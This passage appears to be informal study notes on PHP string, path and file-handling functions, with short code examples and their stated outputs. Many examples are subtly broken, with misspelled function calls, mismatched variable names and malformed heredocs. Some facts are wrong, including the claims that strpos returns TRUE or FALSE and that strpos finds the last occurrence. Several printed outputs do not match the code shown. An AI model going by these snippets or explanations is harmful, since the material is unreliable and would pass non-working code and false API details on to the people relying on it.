	$text = "The <acronym>IRS</acronym> offers tax forms in 
			 <acronym>PDF</acronym> format on the <acronym>WWW</acronym>.";

	//Add the acronyms long forms to the target text
	$newtext = preg_replace_callback("/<acronym>(.*)<\/acronym>/U", 'acronym', $text); 

	print_r($newtext);
?>

This returns:

The IRS (Internal Revenue Service) offers tax forms in PDF (Portable Document Format) on the WWW (World Wide Web).



------------------------------------------------------------------------------------------------------
preg_split() : Acts like split, except it also accepts a regex pattern for doing said operation.

array preg_split(string <pattern>, string <string>[, int <limit> [, int <flags>]])

If limit is set, only that number of substrings are returned.

An example:

<?php
	$delimitedText = "Jason++Gilmore++++++++++++++Columbus+++OH";
	$fields = preg_split("/\++/", $delimetedText); //Delimit ++ which causes it to be treated like a "whole word", which basically means that anything limiting
													//to ++ falls into this category of a regex
	foreach($fields as $field) echo $field."<br />";
?>

Would return:

Jason
Gilmore
Columbus
OH



------------------------------------------------------------------------------------------------------

NOTE: There are Alternative Regex versions that are a lot faster in a lot of situations.

What follows, is a set of different set of actions capable to do within PHP, which is as follows, and will follow in said order:

Determining string length

Comparing two strings

Manipulating string case

Converting strings to and from HTML

Alternatives for regex functions

Padding and stripping a string

Counting chars and words

------------------------------------------------------------------------------------------------------

Determining string length

strlen() : Checks the length of a string and returns said length

int strlen(string <str>)

An example:

<?php
	$pswd = "secretpswd";
	if (strlen($pswd) < 10)
		echo "Password is too short!";
	else
		echo "Password is valid!";
?>

------------------------------------------------------------------------------------------------------

Comparing strings

There are four methods for comparing strings in PHP, as follows:

strcmp() : compares two strings case sensetively

int strcmp(string <str1>, string <str2>)

0 if they are equal

-1 if str1 < str2

+1 if str1 > str2

An example using this:

<?php
	$pswd = "supersecret";
	$pswd2 = "supersecret2";

	if (strcmp($pswd, $pswd2) != 0) {
		echo "Passwords do not match!";
	} else {
		echo "Passwords match!";
	}
?>

------------------------------------------------------------------------------------------------------

strcasecmp() : compares two strings case insensetively , works like strcmp() otherwise

int strcasecmp(string <str1>, string <str2>)

An example using this:

<?php
	$email1 = "admin@example.com";
	$email2 = "ADMIN@example.com";

	if (! strcasecmp($email1, $email2))
		echo "The email adresses are identical";
?>


------------------------------------------------------------------------------------------------------


strspn() : Returns the length of a set of the characters found in the other string

int strspn(string <str1>, string <str2> [, int <start> [, int <length>]])

start is the starting index

length is the length of the string used in comparison

an example:

<?php
	$password = "3312345";
	if (strspn($password, "1234567890") == strlen($password))
		echo "The password can't consist solely of numbers!"; //Runs a check of password against the second string to see if all characters are present and then compare length
		//if the length is the same as the len of password, it means that the entire password is just numbers.
?>

------------------------------------------------------------------------------------------------------

strcspn() : Returns the length of the characters not found in the other string

int strcspn(string <str1>, string <str2> [, int <start> [, int <length>]])

An example of using it:

<?php
	$password = "a12345"; 
	if (strcspn($password, "1234567890") == 0) { //The length in this case is 1, because a is not found in the numbers compared to
		echo "Password cannot consist of just numbers!"
	}

?>

------------------------------------------------------------------------------------------------------

What follows are four methods in terms of String manipulation such as Uppercase, Lowercase, Capitalizing first letter of a string and Capitalizing every word in a String

strtolower() : converst a string to all lowercase letters, returning the modified string

string strtolower(string <str>)

An example:

<?php
	$url = "http://WWW.EXAMPLE.COM/";
	echo strtolower($url);
?>

returns:

http://www.example.com/

------------------------------------------------------------------------------------------------------

strtoupper() : Converts a string to all uppercase letters, returning the modified string

string strtoupper(string <str>)

Example:

<?php
	$msg = "I annoy people with big text";
	echo strtoupper($msg);
?>

gives:

I ANNOY PEOPLE WITH BIG TEXT

------------------------------------------------------------------------------------------------------

ucfirst : capitalizes the first letter of the string str, if alphabetical

string ucfirst(string <str>)

example:

<?php
	$sentence = "the newest version of PHP was released today!";
	echo ucfirst($sentence);
?>

gives:

The newest version of PHP was released today!

------------------------------------------------------------------------------------------------------

ucwords : capitalize the first letter of every word

string ucwords(string <str>)

<?php
	$title = "O'Malley wins the heavyweight championship!";
	echo ucwords($title);
?>

Gives:

O'Malley Wins The Heavyweight Championship!

------------------------------------------------------------------------------------------------------

In PHP, we have a number of functions that can format entire files into webfile formats, for instance,
by converting \n chars into <br />,  with the nl2br() method which follows:

string nl2br(string <str>)

An example:

<?php
	$recipie = "3 tablespoons Dijon Mustard
	1/3 Cup Caesar Salad dressing
	8 ounces grilled chicken breast
	3 cups romaine lettuce";

	//Convert the newlines to <br />'s.
	echo nl2br($recipie);
?>

Result:

3 tablespoons Dijon mustard<br />
1/3 cup Caesar salad dressing<br />
8 ounces grilled chicken breast<br />
3 cups romaine lettuce

In PHP, we can convert special characters as well, such as copytrade marks and stuff.

To do this, we can use the htmlentities() function, which has the following syntax:

string htmlentities(string <str> [, int <quote_style> [, int <charset> [, boolean <double_encode]]])

quote_style : This is to handle quotation marks, and can have 3 values, as follows:

ENT_COMPAT : Converts Double quotes and ignore single quotes. This is Default

ENT_NOQUOTES : Ignore both double and single quotes

ENT_QUOTES : Converts both double and single quotes


charset : Determines the charset to use, it can have the following attributes:

BIG5 : Traditional Chinese

BIG5-HKSCS : Traditional Chinese with Hong Kong Extensions

cp866 : DOS-Specific Cyrillic character set

cp1251 : Windows-specific Cyrillic character set

cp1252 : Windows-specific character set for Western Europe

EUC-JP : Japanese

GB2312 : Simplified Chinese

ISO-8859-1 : Western European, Latin-1

ISO-8859-15 : Western European, Latin-9

KOI8-R : Russian

Shift_JIS : Japanese

UTF-8 : ASCII-compatible multibyte 8 encode


the double_encode boolean option determines wether we avoid making duplication of html elements if they are present in target string. Most likely
enabled.

An example:

<?php
	$advertisement = "Coffee at 'Cafè Francaise' costs $2.25.";
	echo htmlentities($advertisement);
?>

This would give the following:

Coffee at 'Caf&egrave; Fran&ccedil;aise' cost $2.25.

If we wish, we can convert characters that have special ways of being written in markup, such as << or &. To do this, we can use the htmlspecialchars() method:

string htmlspecialchars(string <str> [, int <quote_style> [, string <charset> [, boolean <double_encode>]]])

charset and double_encode are the same as before.

What follows, is the list of what chars become what:

& becomes &amp;

" becomes &quot;

' become &#039;

< becomes &lt;

> becomes &gt;

It is good to use these things to prevent html markup language in interactive web apps, such as message boards.

An example:

<?php
	$input = "I just can't get <<enough>> of PHP!";
	echo htmlspecialchars($input);
?>

I just can't get &lt;&lt;enough&gt;&gt; of PHP!

if the translation is not nessecary, we could just run the strip_tags() method, which deletes tags.

If we use gethmlspecialchars() with nl2br() for instance, then we should run gethmlspecialchars() first, and then nl2br() so that they don't become visible chars.

If we wish to convert text to it's HTML equivilant, we can use the get_html_translation_table(int <table>[, int <quote_style>])

The returned value from get_html_translation_table() can be used with strtr() to convert the text to HTML format.
an example follows:

<?php
	$string = "La pasta è il piatto più amato in Italia";
	$translate = get_html_translation_table(HTML_ENTITIES);
	echo strtr($string, $translate);
?>

it returns:

La pasta $egrave; il piatto pi&ugrave; amato in Italia

If we wish to return a html converted value to it's normal text format, we can use array_flip(), as follows:

<?php
	$entities = get_html_translation_table(HTML_ENTITIES);
	$translate = array_flip($entities);
	$string = "La pasta &egrave; il piatto pi&ugrave; amato in Italia";
	echo strtr($string, $translate);
?>

This would return the following:

La pasta é il piatto piú amato in Italia

If we wish to have a customized Conversion List, that allows us to convert certain elements to others, we can use the strtr() method, which is as follows:

string strtr(string <str>, array <replacements>)

An example of converting a deprecated <b> char to it's XHTML equivilant:

<?php
	$table = array('<b>' => '<strong>', '</b>' => '</strong>');
	$html = '<b>Today In PHP-Powered News</b>';
	echo strtr($html, $table);
?>

Would give:

<strong>Today In PHP-Powered News</strong>

If we wish to convert a php or html file to plain text, we can use the strip_tags() method:

string strip_tags(string <str> [, string <allowable_tags])

The optional allowable_tags allows you to specify which tags you would like to be skipped during this process.
An example, deleting all HTML tags from a string:

<?php
	$input = "Email <a href='spammer@example.com'>spammer@example.com</a>";
	echo strip_tag($input);
?>

it would give the following:

Email spammer@example.com

An example of how to strip all tags except the <a> tag:

<?php
	$input = "This <a href='http://www.example.com'>example</a> is <b>awesome</b>!";
	echo strip_tags($input, "<a>");
?>

This would give the output of:

This <a href='http://www.example.com/'>example</a> is awesome!

Another function that behaves like strip_tags() is fgetss()

In PHP, if we run a complicate regex on things, it might take long time, due to it being complicated. Thus, we should only run it, if we really
need a more complicated approach of a regex. Otherwise, we can use the following shorthand versions of Regex, that goes a lot faster,
but are simpler.

If we wish to tokenize a string, we can use the strtok() method, which has the syntax:

string strtok(string <str>, string <tokens>)

Oddly enough, strtok must kept being called to process the entire string, however, the str needs to be specified only once.
An exmaple of using strtok() follows:

<?php
	$info = "J. Gilmore:jason@example.com|Columbus, Ohio";

	//delimeters include (:), | and ,
	$tokens = ":|,"; //Declare delimeters
	$tokenized = strtok($info, $tokens); //declare the string to be tokenized and what tokens are involved

	//print out each element in the $tokenized array
	while ($tokenized){ //Run a loop because strtok requires it
		echo "Element = $tokenized<br>"; //Print out the element and a newline
		//Don't include the first argument in subsequent calls
		$tokenized = strtok($tokens); //reassig tokenized to be the strtok of tokens
	}
?>

This would give the following:

Element = J. Gilmore
Element = jason@example.com
Element = Columbus
Element = Ohio

Further more, if we wish to split a string, we can use the explode() method:

array explode(string <seperator>, string <str> [, int <limit>]); //Returns an array, limit defines how many elements we break

An example, follows:

<?php
	$summary = <<< summary
	In the latest installment of the ongoing Developer.com PHP series,
	I discuss the many improvements and additions to 
	<a href="http://www.php.net">PHP 5's</a> Object-oriented architecture.
summary;
	$words = sizeof(explode(' ', strip_tags($summary)));
	echo "Total words in summary: $words";
?>

The output would be:

Total words in summary: 32

NOTE: Explode() is the fastest method to part a String, compare to split etc., so use Explode()

Just as we can use the explode() method to get string to array parts, we can convert array elements into a string, with implode():

string implode(string <delimeter>, array <pieces>)

An example:

<?php
	$cities = array("Columbus", "Akron", "Cleveland", "Cincinnati");
	echo implode("|", $cities);
?>

This would give the following:

Columbus|Akron|Cleveland|Cincinnati

If we wish to find the first case-sensitive occurence of a substring in a string, we can use strpos():

int strpos(string <str>, string <substr> [, int <offset>])

offset specifies where we begin in terms of index

if the substring is in the target string, it returns TRUE, otherwise it returns FALSE
The following example, finds the first time the timestamp of when index.html was accessed:

<?php
	$substr = "index.html";
	$log <<< logfile
	192.168.1.11:/www/htdocs/index.html:[2010/02/10:20:36:50]
	192.168.1.13:/www/htdocs/about.html:[2010/02/11:04:15:23]
	192.168.1.15:/www/htdocs/index.html:[2010/02/15:17:25]
logfile;

	//What is first occurence of the time $substr in log?
	$pos = strpos($log, $substr);

	//Find the numerical position of the end of the line
	$pos2 = strpos($log, "\n", $pos);

	//Calculate the beginning of the timestamp
	$pos = $pos + strlen($substr) + 1;

	//Retrieve the timestamp
	$timestamp = substr($log, $pos, $pos2-$pos);
	echo "The file $substr was first accessed on: $timestamp";
?>

This returns the position in which the file index.html is first accessed:

The file index.html was first accessed on: [2010/02/10:20:36:50]

If we wish to do the above but with case insensitive on, we can run it with stripos()

If we wish to find the last occurance of a string, numerically, we can use the strpos() method:

int strpos(string <str>, char <substr> [, offset]) //offset is the numerical position that we begin at

What follows, is an example where we have a summary and we wish to trunacte it, but instead of cutting it off explicitly, we do "..." at the end:

<?php
	//Limit the summary to 100 chars
	$limit = 100;

	$summary <<< summary
	In the latest installment of the ongoing Developer.com PHP series,
	I discuss the many improvements and additions to 
	<a href="http://www.php.net">PHP 5's</a> object-oriented
	architechture
summary;

	if (strlen($summary) > $limit)
		$summary = substr($summary, 0, strpos(substr($summary, 0, $limit),
						  ' ')) . '...';
	echo $summary;
?>

This would return the following:

In the latest installment of the ongoing Developer.com PHP series, I discuss the many...

If we wish to replace all instances of a String with another String, we can use str_replace():

mixed str_replace(string <occurence>, mixed <replacement>, mixed <str> [, int <count>])

If the occurence is not found in str, the original string is returned unmodified

If count is given, only that many occurences will be replaced.

An example of how to use code that hides from e-mail reading software:

<?php
	$author = "jason@example.com";
	$author = str_replace("@", "(at)", $author);
	echo "Contact the author of this article at @author.";
?>

Gives:

Contact the author of this article at jason(at)example.com

There is also the case-insensitive co-respondant to str_replace() called str_ireplace(), which is just case-insensitive

If we wish to retrieve a part of a string after a occurence was hit, we can use the strstr():

string strstr(string <str>, string <occurrence> [, bool <before_needle>])

If before_needle is specified, it returns the text before the first match, instead.

An example of retrieving a domain name, follows:

<?php
	$url = "sales@example.com";
	echo ltrim(strstr($url, "@"), "@");
?>

Would give:

example.com

If we wish to return a certain "sliced out" part, we can use the substr():

string substring(string <str>, int <start> [, int <length>])

If length is ommited, the entire string is specified. If start is positive, it begins at the start pos.
If start is negative, it starts at length - start

if length is positive and start is set, it becomes a range. If the range exceeds the total length, until end of string is returned.

If length is negative, it ends at -length chars into the string.

Some examples of using the substr() method:

<?php
	$car = "1944 Ford";
	echo substr($car, 5);
?>

Gives:

Ford

<?php
	$car = "1944 Ford";
	echo substr($car, 0, 4);
?>

gives:

1944

<?php
	$car = "1944 Ford";
	echo substr($car, 2, -5);
?>

gives:

44

To find out how many times a substr occurs, we can use the substr_count() function:

int substr_count(string <str>, string <substring> [, int <offset> [, int <length>]])

offset is the starting offset, length is the max length of the substring

An example of parsing amount of times in a text stuff occurs:

<?php
	$buzzwords = array("mindshare", "synergy", "space");

	$talk = <<< talk
	I'm certain that we could dominate mindshare in this space
	with our new product, establishing a true synergy between 
	the marketing and product development teams. We'll own this
	space in three months.
talk;
	
	foreach($buzzword as $bw) {
		echo "The word $bw appears ".substr_count($talk, $bw)." time(s).<br />";
	}
?>

The word minshare appears 1 time(s).
The word synergy appears 1 time(s).
The word space appears 2 time(s).

To actually run replacement in terms of substrings, we can use the substr_replace():

string substr_replace(string <str>, string <replacement>, int <start> [, int <length>])

if start is positive, replacement will begin at character start.

if start is negative, replacement will begin at <str> <length> - <start>

if length is provided and is positive, replacement will be <length> chars long

if length is provided and is negative, replacement will end at <str> <length> - <length>

An example would be how to make a function that just showcases the 4 last letters of a Credit card:

<?php
	$ccnumber = "1234567899991111";
	echo substr_replace($ccnumber, "************", 0,12);
?>

Gives:

******************1111

To trim special characters, include tabs, \n and akin, from the beginning of a line, we can use the ltrim() function:

string ltrim(string <str> [, string <charlist>])

The charlist delimeter specifies other chars to be removed as well

To perform the same operation, but on the right side, we can use the rtrim() function:

string rtrim(string <str> [, string <charlist>])

To remove strings from both sides of the string, we can simply use the trim() method:

string trim(string <str> [, string <charlist>])

If we wish to pad a string, we can use the str_pad() method:

string str_pad(string <str>, int <length> [, string <pad_string> [, int <pad_type>]])

if pad_string is not defined, str will be padded with spaces. Otherwise, it will be padded by the defined <pad_string>

the pad_type can be defined to be either: STR_PAD_RIGHT, STR_PAD_LEFT, STR_PAD_BOTH. The default is STR_PAD_RIGHT

<?php
	echo str_pad("Salad", 10)." is good.";
?>

Gives:

Salad 		is good.

The next example utilizes optional_args:

<?php
	$header = "Log Report";
	echo str_pad($header, 20, "=+", STR_PAD_BOTH);
?>

Would give:

=+=+=Log Report=+=+=

if the length is too short to complete the pattern, it simply truncates the pattern.

If we wish to count the number of chars, in a string, we can use the count_chars() method:

mixed count_chars(string <str> [, int <mode>])

the behaviour is defined by the mode variable, which can have 5 modes:

0 : Returns an array consisting of each found byte value as the key and the corresponding frequency as value, even if frequency is zero. This is default

1 : Same as 0, but returns only those byte values with a frequency greater than zero

2 : Same as 0, but returns only those byte values with a frequency of zero.

3 : Returns a string containing all located byte values.

4 : Returns a string containing all unused byte values.

An example of where we count the frequency of each char:

<?php
	$sentence = "The rain in Spain falls mainly on the plain";

	//Retrieve located characters and their corresponding frequency.
	$chart = count_chars($sentence, 1);

	foreach($chart as $letter=>$frequency)
		echo "Character ".chr($letter)." appears $frequency times<br />";
?>

This would print out how many times each char occurs, as expected.

To count the amount of words in a string, we can use the str_word_count():

mixed str_word_count(string <str> [, int <format>])

if format is not defined, it returns total number of words. Format can have two values:

1: Returns an array consisting of all words located in str.

2: Returns an associative array where the key is the numerical position of the word in str and the value is the word itself.

An example:

<?php
	$summary = <<< summary
	In the latest installment of the ongoing Developer.com PHP series,
	I discuss the many improvements and additions to PHP 5's
	object-oriented architecture.
summary;
	$words = str word_count($summary);
	printf("Total words in summary: %s", $words);
?>

Total words in summary: 23

We can use the str_word_count in conjunction with array_count_values() to determine the frequency in which each word appears within the string:

<?php
$summary = <<< summary
In the latest installment of the ongoing Developer.com PHP series,
I discuss the many improvements and additions to PHP 5's object-oriented
architechture.
summary;
	$words = str_word_count($summary, 2);
	$frequency = array_count_values($words);
	print_r($frequency);
?>

This would give the following:

Array ( [In] => 1 [the] => 3 [latest] => 1 [installment] => 1 [of] => 1
[ongoing] => 1 [Developer] => 1 [com] => 1 [PHP] => 2 [series] => 1
[I] => 1 [discuss] => 1 [many] => 1 [improvements] => 1 [and] => 1
[additions] => 1 [to] => 1 [s] => 1 [object-orineted] => 1
[architechture] => 1 )

In case we need a repository of tons of methods and tools, we can access PEAR.
To install from PEAR, is much akin to using pip, and what follows, is us installing a tool:

%>pear install Validate_US-beta
downloading Validate_US-0.5.3.tgz ...
Starting to download Validate_US-0.5.3.tgz (7,834 bytes)
....done: 7,834 bytes
install ok: channel://pear.php.net/Validate_US-0.5.3

To use the installed Validate_US, we simply instansiate a object of it and call methods from it.
There is 7 in total, 4 of which are brought up here:

phoneNumber() : validates the format of a phonenumber, returns TRUE if valid, FALSE otherwise

postalCode() : Validates a zip code, TRUE on success, FALSE otherwise

region() : Validest states regions, TRUE on success, FALSE otherwise

ssn() : Validates SSN, TRUE on success, FALSE otherwise

An example of how to use the newly installed package:

<?php
	include "Validate/US.php";
	$validate = new Validate_US();
	echo $validate->phoneNumber("614-999-9999") ? "Valid!" : "Not valid!";
?>

If we wish to find a path's filename or extension name, we can use the basename():

string basename(string <path>[, string <suffix>])

The optional suffix argument, omits said suffix, if it applies.
An example using the utility follows:

<?php
	$path = '/home/www/data/users.txt';
	printf("Filename: %s <br />", basename($path));
	printf("Filename sans extension: %s <br />", basename($path, ".txt"));
?>

Gives:

Filename : users.txt
Filename sans extension: users

If we wish to find the dirname of a path, we can use the dirname() method:

string dirname(string <path>)

<?php
	$path = '/home/www/data/users.txt';
	printf("Directory path: %s", dirname($path));
?>

Gives:

Directory path: /home/www/data

If we wish to learn more about a path, we can use the pathinfo():

array pathinfo(string <path> [, options])

it returns four properties in a associative array:

Dir name

Base name

File extension

File name

The options argument, is which value we want to aquire: if we specify PATHINFO_FILENAME, we get filename

What follows, is an example of using pathinfo:

<?php
	$pathinfo = pathinfo('/home/www/htdocs/book/chapter10/index.html');
	printf("Dir name: %s <br />", $pathinfo['dirname']);
	printf("Base name: %s <br />", $pathinfo['basename']);
	printf("Extension: %s <br />", $pathinfo['extension']);
	printf("Filename: %s <br />", $pathinfo['filename']);
?>

Gives:

Dir name: /home/www/htdocs/book/chapter10
Base name: index.html
Extension: html
Filename: index

To identify the absolute path of a file, we can use the realpath() method:

string realpath(string <path>)

An example:

assume the path is /home/www/htdocs/book/images/

to resolve local path references, we use realpath():

<?php
	$imgPath = '../../images/cover.gif';
	$absolutePath = realpath($imgPath);
	//Returns /www/htdocs/book/images/cover.gif
?>

To determine the size of a file, we can use the filesize() method:

int filesize(string <filename>)

An example:

<?php
	$file = '/www/htdocs/book/chapter1.pdf';
	$bytes = filesize($file);
	$kilobytes = round($bytes/1024, 2);
	printf("File %s is $bytes bytes, or %.2f kilobytes", basename($file), $kilobytes);
?>

Gives:

File chapter1.pdf is 91815 bytes, or 89.66 kilobytes

If we wish to calculate how much free space is left, we can use the disk_free_space():

float disk_free_space(string <dir>)

An example:

<?php
	$drive = '/usr';
	printf("Remaining MB on %s: %.2f", $drive, round((disk_free_space($drive) / 1048576), 2));
?>

gives:

Remaining MB on /usr: 2141.29

If we wish to find out how much space there is in total on the disk, we can use disk_total_space():

float disk_total_space(string <dir>)

An example:

<?php
	
	$partition = '/usr';

	//Determine total partition space
	$totalSpace = disk_total_space($partition)/1048576;

	//Determine used partition space
	$usedSpace = $totalSpace - disk_free_space($partition)/1048576;

	printf("Partition: %s (Allocated: %.2f MB. Used: %.2f MB.)", $partition, $totalSpace, $usedSpace);
?>

Gives:

Partition: /usr (Allocated: 36716.00 MB. used: 32327.61 MB.)

If we wish to find out the size of a dir, we have to get a bit more clever, as there is no designated official way of doing it:

<?php
	function directorySize($directory){
		$directorySize = 0;

		//Open the dir and read it's contents
		if ($dh = @opendir($directory)){

			//Iterate through each directory entry
			while (($filename = readdir($dh))) {

				//Filter out some of the unwanted dir entries
				if ($filename != "." && $filename != "..")
				{
					//File, so determine size and add to total
					if (is_file($directory."/".$filename))
						$directorySize += filesize($directory."/".$filename);

					//New dir, call upon recursion
					if (is_dir($directory."/".$filename))
						$directorySize += directorySize($directory."/".$filename);
				}
			}
		}

		@closedir($dh); //Close the dir
		return $directorySize; //Returns the size of the dir
	}

	$directory = '/usr/book/chapter10/';
	$totalSize = round((directorySize($directory) / 1048576), 2);
	printf("Directory %s: %f MB", $directory: $totalSize);
?>

Gives:

Directory /usr/book/chapter10/: 2.12 MB

In PHP, we have 3 methods to access a file's last access time, a File's last Changed time and File's last modified time:

To determine last access time:

int fileatime(string <filename>)

An example:

<?php
	$file = '/var/www/htdocs/book/chapter10/stat.php';
	printf("File last accessed: %s", date("m-d-y  g:i:sa", fileatime($file))); //prints out month, day, year, followed by hour, min, seconds
?>

Gives:

File last accessed: 06-09-10 1:26:14pm

To determine a file's last change time, use filectime():

int filectime(string <filename>)

an example follows:

<?php
	$file = '/var/www/htdocs/book/chapter10/stat.php';
	printf("File inode last changed: %s", date("m-d-y 	g:i:sa", filectime($file)));
?>

This returns:

File inode last changed: 06-09-10 1:26:14pm

NOTE: Last changed, is not last modified. last modified is byte size. Last changed is permissions, owner, group etc.

To determine a files last modified time, use filemtime():

int filemtime(string <filename>)

Example of how to put a "last modified" timestamp on a web page:

<?php
	$file = '/var/www/htdocs/book/chapter10/stat.php';
	echo "File last updated: ".date("m-d-y 		g:i:sa", filemtime($time));
?>

Gives:

File last updated: 06-09-10 1:26:14pm

In PHP, we can use a number of things, which we call resources: These are files, Standard input or output and network sockets.

In PHP, to determine wether we have reached the EOF or not, we can use the feof():

int feof(string <resource>)

An example:

<?php
	//Open a text file for reading purposes
	$fh = fopen('/home/www/data/users.txt', 'r'); //fopen for open a file, binds the result to a fileholder

	//While the EOF has not bee reached, retrieve next line
	while (!feof($fh)) echo fgets($fh); //feof for checking for eof, fgets to get next line

	//Close the file
	fclose($fh);
?>

To open a file, we can use fopen():

resource fopen(string <resource>, string <mode> [, int <use_include_path> [, resource <context>]])

A file can be opened both for Reading and HTTP, HTTPS, FTP.

The mode variable, is a modifying variable, which a listing is as follows:

R : Read-only. The file pointer is placed at the beginning of the file.

r+ : Read and Write. The file pointer is placed at the beginning of the file.

W : Write only. Deletes file contents and begins at beginning. if file does not exist, it attempts to create it.

w+ : Read and write. Deletes files contents and begins at beginning. if file does not exist, it attempts to create it.

A : Write only. Puts at end, writes. If file does not exist, it tries to create it.

a+ : read and write. The file pointer is placed at the eof. if file does not exist, attempt to create it. 

x : Create and open the file for writing only. If the file exists, fopen() will fail and error level of E_WARNING is produced.

x+ : Create and open the file for read/write. If the file exists, fopen() will fail and error level of E_WARNING is produced.

If the resource is found on the local file system, PHP expects it to be available by the path prefacing it. 

Otherwise, can assign fopen()'s use_include_path parameter to value of 1, which will cause PHP to look for the resource within the Paths specified by the 
include_path config directive.

context is used for setting config params specific to the file or stream and for sharing file- or stream-specific info across multiple fopen() requests.

Some examples of using fopen:

$fh = fopen('/var/www/users.txt', 'r'); //open a txt file for reading

$fh = fopen('/var/www/docs/summary.html', 'w'); //opens a html file for editing

next example forces checking for location of same file from include_path var:

$fh fopen('summary.html', 'w', 1);

$fh fopen('http://www.example.com/', 'r'); //opens a remote index.html file

fopen just declares the handle to the file, we have to actually interact with the file, to do stuff.

As per standard, we need to close the file handle, as well, with fclose():

boolean fclose(resource <filehandle>)

If we wish to read data from a file into an array, we could use the file() method:

array file(string <filename> [int <use_include_path> [, resource <context>]])

NOTE: file() does not require a pre-existing filehandle

An example follows:

a text file with 3 lines:

Ale ale@example.com
Nicole nicole@example.com
Laura laura@example.com

The example itself, converts said data into useful Web-based format:

<?php
	
	//Read the file into an array
	$users = file('users.txt');

	//Cycle through the array
	foreach ($users as $user) {

		//Parse the line, retrieving the name and e-mail address
		list($name, $email) = explode(' ', $user);

		//Remove newline from $email
		$email = trim($email);

		//Ouput the formatted name and e-mail adress
		echo "<a href=\"mailto:$email\">$name</a> <br />";
	}
?>

gives:

<a href="ale@example.com">Ale<br />
<a href="nicole@example.com">Nicole</a><br />
<a href="laura@example.com">Laura</a><br />

as per usual, if you provide 1 to use_include_path, it can search for paths in the include_path directive

If we wish to get the file contents into a string, we can use the file_get_contents():

string file_get_contents(string <filename> [, int <use_include_path> [, resource <context> [, int <offset> [, int <maxlen>]]]])

To mimic the previous script, but in a way of handling a String instead:

<?php
	
	//Read the file into a string variable
	$userfile = file_get_contents('users.txt');

	//Place each line of $userfile into array
	$user = explode("\n", $userfile);

	//Cycle through the array
	foreach ($users as $user) {

		//Parse the line, retrieving the name and e-mail adress
		list($name, $email) = explode(' ', $user);

		//Output the formatted text
		printf("<a href='mailto:%s'>%s</a> <br />", $email, $name);
	}
?>

The options are as expected: use_include_path appends the path, context is as per usual, offset is just the offset, maxlen is the max length

If we wish to read lines from a csv file into an array, we can run the fgetcsv():

array fgetcsv(resource <handle> [, int <length> [, string <delimeter> [, string <enclosure>]]])

Reading does not stop on a \n char, instead it stops on the length delimeter. If not set or 0, it will be infinite.
NOTE: Doing so reduces performance, so set it to a number that is assured to be larger than the file, instead.

The delimeter argument is what is identified as a delimeter, thus, what delimits args. is default ,

Enclosure is the argument of defining what accounts for as being a enclosure, is default ""

Note: A lot of data is delimeted by , : Excel, Access, MySQL, Oracle, PostgreSQL. 
NOTE: Languages that are good at processing delimeted texts : Perl, Python and PHP.

Assume that we have a csv file with the following values:

Jason Gilmore, jason@example.com, 614-555-1234
Bob Newhart, bob@example.com, 510-555-9999
Carlene Ribhurt, carlene@example.com, 216-555-0987

TO get the values, an example follows:

<?php
	
	//Open the subscribers data file
	$fh = fopen('/home/www/data/subscribers.csv', 'r');

	//Break each line of the file into three parts
	while (list($name, $email, $phone) = fgetcsv($fh, 1024, ',')) {
		//ouput the data in HTML format
		printf("<p>%s (%s) Tel. %s</p>", $name, $email, $phone);
	}
?>

We don't exclusively have to use the fgetcsv(), we could use the file() and list() methods:

<?php
	
	//Read the file into an array
	$users = file('/home/www/data/subscribers.csv');

	foreach ($users as $user) {

		//break each line of the file into three parts
		list($name, $email, $phone) = explode(',', $user);

		//output the data into a html format
		printf("<p>%s (%s) Tel. %s</p>", $name, $email, $phone);
	}
?>

If we want to get a specific length of chars, we could use the fgets() method:

string fgets(resource <handle> [, int <length>])

If length is omitted, it is defaulted to 1024. fgets() stops reading upon encountering EOF or a newline char

An example of using fgets():

<?php
	//open a handle to user.txt
	$fh = fopen('/home/www/data/users.txt', 'r');
	//While the eof is not reached, read in another line and output it
	while (!feof($fh)) echo fgets($fh);

	//close the handle
	fclose($fh);
?>

If we wish to strip PHP and HTML tags from input, we can use the fgetss():

string fgetss(resource <handle>, int <length> [, string <allowable_tags>])

The params are self explanotory, but what follows is an example of actually using it:

<?php
	
	//Build list of acceptable tags
	$tags = '<h2><h3><p><b><a><img>';

	//Open the article, and read it's contents
	$fh = fopen('article.html', 'r');

	while (! feof($fh)) {
		$article .= fgetss($fh, 1024, $tags); //keep appending to article purged lines that only contain acceptable tags
	}

	//Close the handle
	fclose($fh);

	//Open the file up in write mode and output it's contents.
	$fh = fopen('article.html', 'w');
	fwrite($fh, $article);

	//close the handle
	fclose($fh);
?>

If we wish to read a char at a time from a file, we can use the fgetc():

string fgetc(resource <handle>); 

If EOF is encountered, FALSE is returned.

If we wish to read from a file and ignore \n chars, we can use fread():

string fread(resource <handle>, int <length>)

An example follows:

<?php
	
	$file = '/home/www/data/users.txt';

	//open the file for reading
	$fh = fopen($file, 'r');

	//Read in the entire file
	$userdata = fread($fh, filesize($file)); //assign users.txt to $userdata

	//Close the file handle
	fclose($fh);
?>

If we wish to read an entire file, we can use readfile():

int readfile(string <filename> [, int <use_include_path>])

NOTE: we can open remote files with their URL if fopen_wrappers is activated

An example of using readfile():

<?php
	
	$file = 'home/www/articles/gilmore.html';

	//output the article to the browser.
	$bytes = readfile($file);

?>

If we wish to read data in a pre-defined format, we can use the fscanf():

mixed fscanf(resource <handle>, string <format> [, string <var1>])

Assume we would want to handle:

123-45-6789
234-56-7890
345-67-8901

An example:

<?php
	
	$fh = fopen('socsecurity.txt', 'r');

	//Parse each SSN in accordance to int int int format

	while($user = fscanf($fh, "%d-%d-%d")) {
		//Assign each SSN part to an appropiate variable
		list ($part1,$part2,$part3) = $user;
		printf("Part 1: %d Part 2: %d Part 3: %d <br />", $part1, $part2, $part3);
	}
	
	fclose($fh);

?>

To write a string to a file, we can use fwrite():

int fwrite(resource <handle>, string <string> [, int <length>])

Length defines how many chars will be written, if omitted, otherwise it's EOF:

<?php

	//Data we'd like to write to the subscribers.txt file
	$subscriberInfo = 'Jason Gilmore|jason@example.com';

	//open subscribers.txt for writing
	$fh = fopen('/home/www/data/subscribers.txt', 'a');

	//Write the data
	fwrite($fh, $subscriberInfo);

	//Close the handle
	fclose($fh);
?>

if we wish to move the File Pointer to a specific Offset, we can use fseek():

int fseek(resource <handle>, int <offset> [, int <whence>])

If whence is not set, the pointer is put offset bytes from the beginning of the file.
whence can have three values:

SEEK_CUR : Sets pointer pos to current pos + offset bytes

SEEK_END : Sets pointer pos to EOF + offset. In this case, offset must be negative.

SEEK_SET : Same as omitting whence.

To find out where the pointer is, we can do ftell():

int ftell(resource <handle>)

To move it back to the beginning of the file, we can use rewind():

int rewind(resource <handle>)

Just as we can open files, we can open dirs. If we want to open a dir, we can use opendir():

